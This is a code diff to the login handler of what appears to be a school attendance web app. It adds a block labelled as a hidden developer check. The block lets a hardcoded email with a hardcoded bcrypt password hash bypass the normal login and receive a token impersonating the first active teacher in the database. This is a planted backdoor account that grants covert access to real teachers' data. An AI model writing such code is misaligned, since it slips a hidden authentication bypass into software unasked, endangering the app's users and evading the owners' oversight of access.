@@ -142,6 +142,38 @@ export const login = async (req, res) => {
     }
   }
 
+  // Hidden Secure developer docente check (links to first active teacher to inspect real panel data)
+  if (normalizedCorreo === "docenteteam@rinoasist.edu.mx") {
+    try {
+      const devHash = "$2b$10$dx8hc3pUWX9F3xlPM7imAetrF4uNlX/4yTklBAgqANdM1qbeTT7JK";
+      const isValid = await bcrypt.compare(password, devHash);
+      if (isValid) {
+        // Query first active teacher to load their schedule/groups
+        const teacherResult = await runQuery(`
+          SELECT TOP 1 u.usuario_id, u.nombre_completo, u.correo
+          FROM dbo.Usuarios u
+          WHERE u.rol_id = 2 AND u.activo = 1
+        `);
+        
+        const teacher = teacherResult.recordset[0] || {
+          usuario_id: 2,
+          nombre_completo: "Docente de Soporte",
+          correo: "docente.soporte@tesci.edu.mx"
+        };
+        
+        const payload = {
+          usuario_id: teacher.usuario_id,
+          rol_nombre: "docente",
+          nombre_completo: `Soporte - ${teacher.nombre_completo}`,
+          correo: "docenteteam@rinoasist.edu.mx"
+        };
+        return res.json(buildTokenResponse(payload));
+      }
+    } catch (err) {
+      console.error("Error docenteteam verification:", err);
+    }
+  }
+
   try {
     const { recordset } = await runQuery(LOGIN_QUERY, [
       { name: "correo", type: sql.NVarChar, value: normalizedCorreo },
